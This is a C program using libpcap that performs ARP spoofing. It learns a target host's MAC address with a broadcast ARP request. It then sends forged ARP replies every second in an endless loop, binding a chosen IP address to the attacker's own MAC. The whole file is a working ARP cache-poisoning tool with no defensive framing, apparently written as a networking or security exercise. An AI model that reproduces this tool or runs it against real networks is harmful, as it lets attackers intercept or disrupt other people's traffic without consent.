#include <stdlib.h>
#include <stdio.h>
#include <pcap/pcap.h>
#include <pcap.h>
#include <string.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#pragma pack(1)

#include "header.h"

void getMacAddress(char *interface, unsigned char * my_mac){
	/* get my Mac Address */
	int sock_mac = socket(PF_INET, SOCK_DGRAM, 0);
	struct ifreq req_mac;
        strncpy(req_mac.ifr_name, interface, IF_NAMESIZE - 1);
	ioctl(sock_mac, SIOCGIFHWADDR, &req_mac);	
	close(sock_mac);
	memmove((void*)&my_mac[0],(void*)&req_mac.ifr_hwaddr.sa_data[0],6);
}

void setPacket(struct ether_h *e_h, struct arp_hdr *a_h, struct ARP_Spoof *ARP_Sp){

	/* make the BroadCast Packet into EtherNet Header 14byte */
	memcpy(e_h->ether_dst_mac, ARP_Sp->ether_dst_mac , 6);
	memcpy(e_h->ether_src_mac, ARP_Sp->ether_src_mac, 6);
	e_h->ether_type = htons (0x806);

	/* make the BroadCast Packet into ARP Header 28byte */
	a_h->hardware_type = htons (0x1); 
	a_h->proto_type = htons (0x800);
	a_h->hard_add_len = (0x6);
	a_h->proto_add_len = (0x4);  
	a_h->opcode = ARP_Sp->opcode;        
	memcpy(a_h->send_mac, ARP_Sp->ether_src_mac, 6 );	
	a_h->ip_src = ARP_Sp->ip_src;
	memcpy(a_h->dst_mac, ARP_Sp->ether_dst_mac, 6 );
	a_h->ip_dst = ARP_Sp->ip_dst;
}

void sendRequestPacket(struct ether_h et_h, struct arp_hdr arp_h, pcap_t* handle )
{
	/* setting the ARP Packet */
	u_char packet[60];
	memcpy(packet ,&et_h ,14);
        memcpy(packet+14 ,&arp_h ,28); 
	pcap_sendpacket(handle, packet, 60 /* size */);
}

int check_ARP_Reply(pcap_t *handle,  struct ARP_Spoof *spoof_info){
	struct ether_h *et_h;
        struct arp_hdr *arp_h;
	while (true) {
		struct pcap_pkthdr* header;
    		const u_char* packet;
    		int res = pcap_next_ex(handle, &header, &packet);
    		
    		if (res == 0) continue;
    		if (res == -1 || res == -2) break;

    		et_h = (struct ether_h *)packet;
		//ETHERTYPE_ARP 0x806
    		if (htons(et_h->ether_type) == ETHERTYPE_ARP){
			arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_h));
			 /* check Arp Reqest src IP */
			if (memcmp((void*)&spoof_info->ip_dst, (void*)&arp_h->ip_src, 4) ==0){
				memcpy(spoof_info->ether_dst_mac, et_h->ether_src_mac, 6);
				return 1;	
			}

    		}

	}


}


int main(int argc, char *argv[])
{
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[60];
	char *dev = argv[1];
	struct ether_h et_h;
        struct arp_hdr arp_h;	
	struct ARP_Spoof spoof_info;

        /* Check the validity of the command line */
    	if (argc != 4){
        	printf("usage: %s interface (e.g. 'rpcap://eth0')", argv[0]);
        	return -1;
    	}
        
	/* Open the output device */
    	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  	if (handle == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    		return -1;
  	}
        
	/* get the my Device MAC Address*/
	unsigned char myMac[6];
	getMacAddress(dev, myMac); //dev ens33 wlan0
	


	/* Setting BroadCast ARP Packet */ 
	char broadCast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	memcpy(spoof_info.ether_dst_mac, broadCast , 6 );
	memcpy(spoof_info.ether_src_mac, myMac , 6 );
	inet_aton(argv[2], &spoof_info.ip_src);
	inet_aton(argv[3], &spoof_info.ip_dst);	
	spoof_info.opcode = htons(0x01);	

	/* Send Request Packet */
	setPacket(&et_h, &arp_h, &spoof_info);
	sendRequestPacket(et_h, arp_h, handle);

	/* Recive ARP Packet */
	if (check_ARP_Reply(handle, &spoof_info) )
	{
		spoof_info.opcode = htons(0x02);	
		
		setPacket(&et_h, &arp_h, &spoof_info);
	}

	/* Send Reply Packet */			
	while(1){
		printf("send arp Packet\n");
		sleep(1);
		sendRequestPacket(et_h, arp_h, handle);
	}
	
	return 0;
   
}
